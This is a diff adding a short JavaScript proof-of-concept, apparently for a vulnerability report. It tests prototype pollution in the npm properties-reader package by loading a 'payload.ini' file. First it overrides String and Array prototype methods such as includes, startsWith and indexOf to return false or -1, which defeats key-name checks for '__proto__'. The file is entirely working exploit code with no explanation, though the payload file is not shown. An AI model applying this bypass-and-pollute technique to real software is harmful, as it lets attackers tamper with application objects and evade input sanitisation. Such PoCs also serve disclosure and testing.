@@ -1,0 +1,15 @@
+String.prototype.includes = () => false;
+String.prototype.startsWith = () => false;
+String.prototype.endsWith = () => false;
+String.prototype.indexOf = () => -1;
+String.prototype.lastIndexOf = () => false;
+String.prototype.match = () => false;
+String.prototype.search = () => false;
+String.prototype.matchAll = () => false;
+Array.prototype.includes = () => false;
+Array.prototype.indexOf = () => -1;
+const propertiesReader = require('properties-reader');
+const path = require('path');
+console.log({}.polluted);
+propertiesReader(path.resolve(__dirname, './payload.ini'));
+console.log({}.polluted);
